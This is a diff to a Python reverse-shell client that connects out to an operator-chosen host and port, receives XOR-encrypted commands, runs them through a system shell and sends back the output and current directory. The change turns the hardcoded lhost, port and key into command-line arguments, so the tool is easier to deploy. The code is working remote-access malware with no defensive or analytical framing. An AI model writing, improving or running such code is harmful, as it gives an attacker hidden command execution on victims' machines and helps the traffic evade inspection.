@@ -6,16 +6,19 @@
 
 import os
 import subprocess
+import argparse
 from socket import socket, AF_INET, SOCK_STREAM
 from Crypto.Cipher import XOR
 
+parser = argparse.ArgumentParser(description='XOR Shell Client')
+parser.add_argument('-a','--host', help='set lhost', required=True)
+parser.add_argument('-p','--port', help='set lport', required=True)
+parser.add_argument('-k','--key', help='set XOR key', required=True)
+args = vars(parser.parse_args())
 
-
-
-
-key = 'keyiskey'
-myHOST = '192.168.44.128'
-myPORT = 1111
+myHOST = args['host']
+myPORT = int(args['port'])
+key = args['key']
 
 def encrypter(cleardata):
     data = XOR.XORCipher(key)
@@ -41,14 +44,15 @@ def client():
 
         if len(data) > 0:
             cmd = subprocess.Popen(data[:], shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE)
             output = (cmd.stdout.read() + cmd.stderr.read()).decode('cp866')
             sockobj.send(encrypter(output + (os.getcwd() + '> ')))
+
     sockobj.close()
 
 try:
     client()
 except:
-    print('Error')
+    print('An error occured')
